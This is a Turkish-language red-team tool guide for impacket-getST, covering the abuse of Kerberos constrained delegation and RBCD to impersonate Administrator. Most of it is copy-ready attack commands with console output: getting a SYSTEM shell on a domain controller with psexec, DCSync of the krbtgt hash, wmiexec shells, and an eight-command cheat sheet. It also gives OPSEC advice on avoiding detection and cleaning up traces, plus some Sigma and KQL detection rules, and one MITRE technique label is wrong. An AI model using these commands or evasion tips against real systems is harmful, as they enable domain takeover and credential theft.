# impacket-getST

> **Kategori:** [6. Kerberos Protokol Cephaneliği](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Microsoft Kerberos protokol uzantılarını (S4U2self ve S4U2proxy) kullanarak, ele geçirilmiş bir servis veya makine hesabı adına herhangi bir etki alanı kullanıcısını (örneğin `Administrator`) taklit eden ve hedef servise yönelik Hizmet Biletleri (Service Ticket / TGS) üreten, Kısıtlı Yetki Devri (Constrained Delegation) ve RBCD sömürü aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında servislerin kullanıcılar adına diğer arka uç sunucularla (örneğin bir IIS web uygulamasının MSSQL veritabanı ile) iletişim kurabilmesi için Kerberos Yetki Devri (Delegation) mimarisi kullanılır. Microsoft bu yetkilendirmeyi yönetebilmek amacıyla Kerberos protokolüne iki kritik uzantı eklemiştir:
1. **S4U2self (Service for User to Self):** Bir servisin, kendi adına herhangi bir etki alanı kullanıcısını (örneğin `Administrator`) taklit eden bir hizmet bileti talep etmesine olanak tanır. Servis bu adımda kullanıcının parolasını bilmek zorunda değildir.
2. **S4U2proxy (Service for User to Proxy):** Servisin, S4U2self adımında elde ettiği bileti KDC'ye sunarak, yetkili olduğu hedef başka bir servise (örneğin `cifs/target.corp.local`) o kullanıcı adına erişim sağlayacak ikinci bir Hizmet Bileti (Service Ticket) talep etmesini sağlar.

Bu uzantılar iki farklı delegasyon senaryosunda kritik sömürü vektörlerine dönüşür:
- **Geleneksel Kısıtlı Yetki Devri (Constrained Delegation):** Servis hesabında `msDS-AllowedToDelegateTo` özniteliği tanımlıdır. Eğer `TRUSTED_TO_AUTH_FOR_DELEGATION` (Protokol Geçişi) bayrağı aktifse, servis herhangi bir kullanıcı adına hedef makinede tam yetkili bilet alabilir.
- **Kaynak Tabanlı Kısıtlı Yetki Devri (RBCD):** Hedef makinenin `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine saldırganın kontrolündeki bir bilgisayar/servis hesabı eklenmiştir. Ön uç hesabı herhangi bir özel hakka sahip olmasa dahi hedef makine için `Administrator` bileti alabilir.

**`impacket-getST`**, bu iki aşamalı S4U bilet değişimini otomatik olarak yönetir. Elde ettiği nihai hizmet biletini Linux `.ccache` formatında kaydeder ve saldırganın hedef sunucuda SYSTEM/Administrator haklarıyla komut çalıştırmasını sağlar.

### Mimari Akış Şeması

```
[ Saldırgan Kontrolündeki Hesap (Örn: EVILPC$ veya svc_web) ]
       │
       │ (1) KDC'den TGT Talep Edilir (impacket-getTGT veya dahili)
       ▼
[ S4U2self Aşaması ]
       │
       │ (2) KDC'ye KRB_TGS_REQ Gönderilir:
       │     "Ben EVILPC$, 'Administrator' adına KENDİME (EVILPC$) bir bilet istiyorum!"
       ▼
[ KDC (Domain Controller:88) ]
       │
       │ (3) S4U2self TGS Bileti Üretilir (Administrator yetkileriyle)
       ▼
[ S4U2proxy Aşaması ]
       │
       │ (4) KDC'ye İkinci KRB_TGS_REQ Gönderilir:
       │     "Elimde Administrator'ın bana ait bileti var.
       │      Bunu kullanarak 'cifs/target.corp.local' için bilet ver!"
       ▼
[ KDC Yetki Kontrolü ]
       ├── RBCD: target.corp.local nesnesinde msDS-AllowedToAct içinde EVILPC$ var mı?
       └── Constrained: EVILPC$ nesnesinde msDS-AllowedToDelegateTo içinde target var mı?
       │     └── ONAYLANDI!
       ▼
[ KRB_TGS_REP Döner: target.corp.local CIFS Bileti (Administrator Adına) ]
       │
       ▼
[ Çıktı: Administrator@cifs_target.corp.local@CORP.LOCAL.ccache ]
       │
       ▼
[ Pass-the-Ticket ile Hedef Sisteme Tam Erişim: psexec / wmiexec / secretsdump ]
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Sıfır Parola ile Kimlik Taklidi**| `Administrator` kullanıcısının parolasını bilmeden onun adına geçerli Kerberos bileti üretir. | RBCD veya Constrained Delegation bulunan ortamlarda anında Domain Admin seviyesine yükselme sağlar. |
| **SPN Değiştirme (Service Name Substitution)**| Alınan CIFS biletini LDAP, HOST veya HTTP servislerine uyarlayabilir (`-altservice`). | Tek bir yetki ile dosya paylaşımından DCSync yapmaya (LDAP'a geçiş) olanak tanır. |
| **RBCD ile Kusursuz Entegrasyon**| `ntlmrelayx`, `KrbRelay` veya `Coercer` ile yapılandırılan RBCD saldırılarının nihai meyvesidir. | Zorlamalı kimlik doğrulama zincirini uzaktan kod yürütmeye bağlar. |
| **Doğrudan .ccache Üretimi** | Elde edilen bileti standart Linux MIT Kerberos dosyasında saklar. | Impacket araçlarıyla (`psexec`, `wmiexec`) doğrudan Pass-the-Ticket yapmayı sağlar. |

### Karşılaştırma Tablosu

| Kriter | impacket-getST | Rubeus (s4u) | KrbRelayUp | tgstomp |
|---|---|---|---|---|
| **Platform** | Linux / Python | Windows (.NET / C#) | Windows (.NET / C#) | Windows (.NET / C#) |
| **Girdi Tipi** | TGT (.ccache) / Hash / Parola | TGT / Hash / Ticket | Hepsi Bir Arada | Bilet Manipülasyonu |
| **Protokol** | S4U2self + S4U2proxy | S4U2self + S4U2proxy | S4U2self + S4U2proxy | Kerberos Roasting |
| **SPN Değiştirme** | Var (`-altservice`) | Var (`/altservice:`) | Otomatik | Yok |
| **Kullanım Yeri** | Linux Pivot & Ağ Saldırıları | Windows Bellek İçi | Yerel Yetki Yükseltme | EDR Atlatma |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
impacket-getST -spn <HEDEF_SPN> -impersonate <TAKLiT_EDILECEK_KULLANICI> [KIMLIK_SECENEKLERI] <ETKI_ALANI>/<HESAP>
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-spn <ad>` | Bilet talep edilecek hedef Service Principal Name (Zorunlu). | `-spn cifs/target.corp.local` |
| `-impersonate <ad>` | Taklit edilecek hedef kullanıcı (Genellikle `Administrator`). | `-impersonate Administrator` |
| `-hashes [LM:]NTLM` | Servis/makine hesabının NTLM karma değeri. | `-hashes :01fc5a...` |
| `-aesKey <hex>` | Servis/makine hesabının Kerberos AES-128 veya AES-256 anahtarı. | `-aesKey 1673...` |
| `-k` | Önceden alınmış servis hesabı TGT biletini (`KRB5CCNAME`) kullanır. | Bayrak |
| `-no-pass` | Parola sormaz (`-k` veya `-hashes` ile birlikte kullanılır). | Bayrak |
| `-dc-ip <ip>` | Bağlanılacak etki alanı denetleyicisinin doğrudan IP adresi. | `-dc-ip 192.168.1.10` |
| `-altservice <ad>` | Biletin hedef servis adını değiştirir (Örn: `cifs` yerine `ldap` veya `host`). | `-altservice ldap` |
| `-force-forwardable`| S4U2self biletinde Forwardable bayrağını zorlar (Protokol geçişi kapalıysa). | Bayrak |
| `-outputfile <dosya>` | Üretilen biletin kaydedileceği hedef dosya adı. | `-outputfile /tmp/admin.ccache`|

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: RBCD Sömürüsü — Ele Geçirilen Makine Hesabı İle Domain Controller Ele Geçirme

Daha önce `ntlmrelayx --delegate-access` ile `DC01` üzerinde `EVILPC$` hesabımıza RBCD izni yazılmıştır. Şimdi `EVILPC$` hesabının parolası kullanılarak DC01 CIFS servisi için `Administrator` adına bilet alınır.

```bash
impacket-getST -spn cifs/dc01.corp.local \
  -impersonate Administrator \
  -dc-ip 192.168.1.10 \
  corp.local/EVILPC\$:'Password_Random123!'
```

**Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self for user Administrator to SPN EVILPC$
[*] Got S4U2self for user Administrator!
[*] Requesting S4U2proxy for service cifs/dc01.corp.local
[*] Got S4U2proxy service ticket for Administrator!
[*] Saving ticket in Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache
[+] Service Ticket successfully saved!
```

---

### Senaryo 2: Elde Edilen Bilet ile Hedef Sistemde SYSTEM Kabuğu Açma (Pass-the-Ticket)

Senaryo 1'de üretilen bilet oturuma yüklenir ve `impacket-psexec` ile DC01 üzerinde doğrudan `NT AUTHORITY\SYSTEM` kabuğu elde edilir.

```bash
# 1. Bilet ortam değişkenini tanımlayın
export KRB5CCNAME=Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache

# 2. psexec ile parola sormaksızın Kerberos üzerinden bağlanın
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
```

**Konsol Çıktısı:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on dc01.corp.local.....
[*] Found writable share ADMIN$
[*] Uploading file ksbh.exe...
[*] Opening SVCManager on dc01.corp.local.....
[*] Creating service ksbh on dc01.corp.local.....
[*] Starting service ksbh.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

---

### Senaryo 3: Geleneksel Kısıtlı Yetki Devrinde SPN Değiştirme (`-altservice ldap` ile DCSync)

Bir servis hesabının (`svc_sql`) yalnızca `cifs/dc01.corp.local` servisine kısıtlı yetki devri (`msDS-AllowedToDelegateTo`) bulunmaktadır. Ancak DCSync yapabilmek için `ldap/dc01.corp.local` biletine ihtiyaç vardır. `-altservice ldap` parametresi ile bilet LDAP servisine dönüştürülür.

```bash
impacket-getST -spn cifs/dc01.corp.local \
  -altservice ldap \
  -impersonate Administrator \
  -hashes :01fc5a6be7bc6929c40372d23f5052b3 \
  -dc-ip 192.168.1.10 \
  corp.local/svc_sql
```

**DCSync Çalıştırma:**

```bash
export KRB5CCNAME=Administrator@ldap_dc01.corp.local@CORP.LOCAL.ccache
impacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.local/Administrator@dc01.corp.local
```

---

### Senaryo 4: Mevcut TGT (.ccache) Kullanarak S4U Bilet Değişimi

Servis hesabının parolası veya hash'i doğrudan bilinmiyor ancak hafızadan çekilmiş TGT bileti (`svc.ccache`) mevcutsa:

```bash
export KRB5CCNAME=/tmp/svc.ccache
impacket-getST -k -no-pass \
  -spn host/fileserver.corp.local \
  -impersonate Administrator \
  -dc-ip 192.168.1.10 \
  corp.local/svc_backup
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Kerberos SessionError: KDC_ERR_BADOPTION (13)` | KDC bilet talebindeki seçenekleri reddetti; kurban hesapta Kısıtlı Yetki Devri veya RBCD yapılandırması eksik. | Hedef makinenin `msDS-AllowedToActOnBehalfOfOtherIdentity` veya servis hesabının `msDS-AllowedToDelegateTo` özniteliğini kontrol edin. |
| `Kerberos SessionError: KDC_ERR_POLICY (12)` | Taklit edilmek istenen kullanıcı `Protected Users` grubuna üye veya hesapta `Account is sensitive and cannot be delegated` seçili. | KDC bu kullanıcının S4U ile taklit edilmesini engeller; başka bir Domain Admin veya yetkili hesap taklit edin (`--impersonate`). |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN (7)` | Belirtilen `-spn` KDC veritabanında kayıtlı değil. | SPN değerinin tam FQDN adını içerdiğinden emin olun (`cifs/host.corp.local`). |
| `Kerberos SessionError: KRB_AP_ERR_MODIFIED (41)` | S4U2self biletinde Forwardable bayrağı eksik (Protokol geçişi yetkisi yok). | Komuta `-force-forwardable` bayrağını ekleyerek veya geçerli bir TGT ile deneyin. |
| `Kerberos SessionError: KRB_AP_ERR_SKEW (37)` | Saldırgan makinesi ile Domain Controller saat farkı 5 dakikayı aşıyor. | `sudo rdate -n <DC_IP>` veya `sudo ntpdate <DC_IP>` ile sistem saatini senkronize edin. |
| `KeyError: 'target'` | Etki alanı kullanıcı adı veya FQDN formatında sözdizimi hatası yapıldı. | Komut sözdizimini `corp.local/kullanici` şeklinde kontrol edin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: DÜŞÜK-ORTA (KDC LOGLARI)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4769 (S4U2self & S4U2proxy TGS Talepleri)
[ Kritik Belirti ]  : Transited Services & Additional Account Info
[ Ağ İmzası ]       : Port 88 üzerinde art arda 2 adet TGS-REQ paketi
[ EDR / AV ]        : Host tarafında sıfır iz (Saf ağ tabanlı Kerberos)
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4769 (A Kerberos service ticket was requested):**
   - **S4U2self İmzası:** Bir servis hesabı kendi SPN'i için `TargetUserName: Administrator` adına bilet istediğinde loglanır.
   - **S4U2proxy İmzası:** İkinci Event ID 4769 kaydında `ServiceName` hedef sunucuya (`cifs/target`), talep eden ise servis hesabına aittir.
   - **Transited Services Alanı:** KDC loglarında biletin delegasyon üzerinden aktarıldığı açıkça görünür.
2. **Directory Service Changes Event ID 4738:**
   - RBCD yapılandırılırken kaydedilen `msDS-AllowedToActOnBehalfOfOtherIdentity` öznitelik değişikliği saldırının başlangıç izidir.

### 5.2 Ağ ve EDR İmzaları

- **Sıralı TGS Paketleri:** Ağda bir servis hesabının önce kendi adına yabancı bir kullanıcı için bilet istemesi, ardından saniyeler içinde bu biletle başka bir hedefe yönelmesi SIEM davranışsal kuralları için birincil imzadır.
- **Protected Users Korunması:** Savunma ekipleri hassas hesapları `Protected Users` grubuna eklediğinde KDC bu isteği doğrudan `KDC_ERR_POLICY` ile reddeder ve güvenlik günlüğüne hata yansıtır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1558.003** | Subverting Trust: Kerberos Ticket Manipulation | S4U2self ve S4U2proxy ile sahte servis bileti üretme. |
| **T1550.002** | Use Alternate Authentication Material: Pass the Ticket | Üretilen bileti oturuma yükleyerek yanal hareket yapma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Administrator İsmi İmzası** | Her zaman `Administrator` hesabını taklit etmek yerine, hedef makinede yerel yönetici hakkı olan sıradan bir kullanıcıyı taklit edin. |
| **Transited Services Logu** | Delegasyon logları KDC üzerinde net bir iz bırakır; operasyonu hedeflenen kritik sunucularla sınırlı tutun. |
| **RBCD Temizliği** | S4U2Proxy bileti alındıktan sonra hedef makinedeki `msDS-AllowedToAct` özniteliğini orijinal haline getirin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — S4U2self Üzerinden Yönetici Taklidi Tespiti:**

```yaml
title: Suspicious S4U2self Kerberos Ticket Request for Privileged User
status: experimental
description: Detects a service account requesting a service ticket for itself impersonating Domain Admins.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
  privileged_impersonation:
    TargetUserName: 'Administrator'
  filter:
    ServiceName|endswith: '$'
  condition: selection and privileged_impersonation and filter
level: high
```

**Microsoft Sentinel (KQL) — S4U2proxy Delegasyon Anomalisi:**

```kql
SecurityEvent
| where EventID == 4769
| where TicketOptions has "0x40800000" // Forwardable & Constrained Delegation
| where TargetUserName == "Administrator"
| project TimeGenerated, TargetUserName, ServiceName, IpAddress, TicketOptions
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: RBCD İstismarı ile Administrator Bileti Alma
```bash
impacket-getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip 192.168.1.10 corp.local/EVILPC\$:'Pass123!'
```
- **Ne Yapar?** Kontrol altındaki `EVILPC$` hesabı üzerinden hedef makinede `Administrator` adına CIFS servis bileti talep eder ve `.ccache` olarak kaydeder.
- **Ne Zaman Kullanılır?** RBCD yapılandırması tamamlandıktan sonra hedef makineye yönetici erişimi elde etmek için.
- **Parametreler:** `-spn`: Hedef makine ve servis, `-impersonate`: Taklit edilecek kullanıcı, `-dc-ip`: DC adresi.

### Komut 2: NTLM Hash ile Kısıtlı Yetki Devri Sömürüsü
```bash
impacket-getST -spn cifs/fileserver.corp.local -impersonate Administrator -hashes :01fc5a... -dc-ip 192.168.1.10 corp.local/svc_web
```
- **Ne Yapar?** Servis hesabının NTLM hash'ini kullanarak `fileserver` için S4U bilet değişimi yapar.
- **Ne Zaman Kullanılır?** Servis hesabının parolası bilinmediğinde ancak hash'i ele geçirildiğinde.
- **Parametreler:** `-hashes`: Servis hesabının NTLM hash'i.

### Komut 3: SPN Değiştirerek LDAP Bileti Alma (DCSync Amaçlı)
```bash
impacket-getST -spn cifs/dc01.corp.local -altservice ldap -impersonate Administrator -dc-ip 192.168.1.10 corp.local/EVILPC\$:'Pass123!'
```
- **Ne Yapar?** Hedef CIFS servisi için alınan bileti LDAP servisine dönüştürerek KDC'den LDAP hizmet bileti alır.
- **Ne Zaman Kullanılır?** Elde edilen bilet ile secretsdump (DCSync) çalıştırmak istendiğinde.
- **Parametreler:** `-altservice ldap`: Alternatif servis adı belirtimi.

### Komut 4: Mevcut TGT (.ccache) ile S4U Bileti Üretme
```bash
export KRB5CCNAME=/tmp/evilpc.ccache
impacket-getST -k -no-pass -spn host/target.corp.local -impersonate Administrator -dc-ip 192.168.1.10 corp.local/EVILPC\$
```
- **Ne Yapar?** Servis hesabının TGT biletini kullanarak parola girmeden S4U2self ve S4U2proxy adımlarını işletir.
- **Ne Zaman Kullanılır?** Makine hesabı parolası doğrudan bilinmeyip TGT bellekte mevcut olduğunda.
- **Parametreler:** `-k`: Kerberos kullan, `-no-pass`: Parola sorma.

### Komut 5: Farklı Bir Servis Adı (HOST / WSMAN) Hedefleme
```bash
impacket-getST -spn wsman/target.corp.local -impersonate Administrator -dc-ip 192.168.1.10 corp.local/EVILPC\$:'Pass123!'
```
- **Ne Yapar?** CIFS yerine Windows Uzaktan Yönetim (WinRM / WSMAN) servisi için bilet talep eder.
- **Ne Zaman Kullanılır?** `evil-winrm` ile Kerberos üzerinden bağlanmak istendiğinde.
- **Parametreler:** `-spn wsman/...`: WinRM servis tanımı.

### Komut 6: Protokol Geçişi Kapalıyken Forwardable Bilet Zorlama
```bash
impacket-getST -spn cifs/target.corp.local -impersonate Administrator -force-forwardable -dc-ip 192.168.1.10 corp.local/svc_app:'Pass123!'
```
- **Ne Yapar?** S4U2self biletinde iletilebilir (Forwardable) bayrağını zorlayarak yetki devrini aşmaya çalışır.
- **Ne Zaman Kullanılır?** Hedef serviste protokol geçişi yetkisi bulunmadığında.
- **Parametreler:** `-force-forwardable`: Bilet bayrağını manipüle et.

### Komut 7: Özel Çıktı Dosyasına Kaydetme
```bash
impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator -outputfile /tmp/dc_admin.ccache -dc-ip 192.168.1.10 corp.local/EVILPC\$:'Pass123!'
```
- **Ne Yapar?** Oluşturulan biletin tam dosya yolunu belirler.
- **Ne Zaman Kullanılır?** Dosya adlarını standartlaştırmak ve otomasyon betikleriyle entegre etmek için.
- **Parametreler:** `-outputfile`: Çıktı dosyası yolu.

### Komut 8: Elde Edilen Bilet ile WMI Komut Kabuğu Açma
```bash
export KRB5CCNAME=Administrator@cifs_target.corp.local@CORP.LOCAL.ccache
impacket-wmiexec -k -no-pass corp.local/Administrator@target.corp.local
```
- **Ne Yapar?** S4U biletiyle hedef makinede WMI üzerinden etkileşimli komut istemi açar.
- **Ne Zaman Kullanılır?** SMB tabanlı psexec yerine WMI tercih edildiğinde.
- **Parametreler:** `-k`: Kerberos oturumu, `-no-pass`: Parolasız doğrulama.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Fortra / Impacket](https://github.com/fortra/impacket)
- **Elad Shamir Araştırması:** [Wagging the Dog: Abusing Resource-Based Constrained Delegation](https://posts.specterops.io/wagging-the-dog-abusing-resource-based-constrained-delegation-a313e68b35c0)
- **Microsoft Dokümantasyonu:** [S4U2self and S4U2proxy Kerberos Protocol Extensions](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/)
- **Dirk-jan Mollema:** [Worst of Both Worlds: Kerberos Delegation](https://dirkjanm.io/)

---

> **Önceki:** [← impacket-getTGT](./impacket-getTGT.md) · **Sonraki:** [impacket-ticketer →](./impacket-ticketer.md)
